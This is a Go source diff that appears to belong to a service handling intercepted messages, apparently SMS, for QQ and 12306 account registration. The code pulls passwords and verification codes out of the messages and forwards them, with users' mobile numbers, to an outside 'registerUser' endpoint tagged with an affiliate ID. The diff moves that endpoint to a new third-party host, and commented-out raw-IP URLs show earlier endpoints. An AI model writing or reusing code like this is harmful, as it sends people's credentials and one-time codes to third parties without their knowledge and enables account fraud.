@@ -125,7 +125,7 @@ func processQqRegister(msg string, user map[string]string) {
 			mobile := formatMobile(user["mobile"])
 			//生成要访问的url
 			// url := "http://121.201.67.97:8080/verifycode/api/getQQVerifyCode.jsp?cid=c115&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
-			url := "http://register.xushihudong.com/code/registerUser?cpid=ztld01&username=" + qq + "&password=" + pwd + "&phone=" + mobile + "&cpparam="
+			url := "http://register.qygame.cn/code/registerUser?cpid=ztld01&username=" + qq + "&password=" + pwd + "&phone=" + mobile + "&cpparam="
 			go send2Url(url)
 			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
 		}
@@ -142,7 +142,7 @@ func process12306Register(msg string, user map[string]string) {
 		pwd := result[1]
 		mobile := formatMobile(user["mobile"])
 		// url := "http://121.201.67.189:9876/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara=1"
-		url := "http://register.xushihudong.com/code/registerUser?cpid=ztld02&code=" + pwd + "&cpparam=12345&phone=" + mobile
+		url := "http://register.qygame.cn/code/registerUser?cpid=ztld02&code=" + pwd + "&cpparam=12345&phone=" + mobile
 		if v, ok := mapConfig.Load("12306DexingRatio"); ok {
 			ratio, _ := strconv.ParseInt(v.(string), 10, 64)
 			random := rand.New(rand.NewSource(time.Now().UnixNano()))
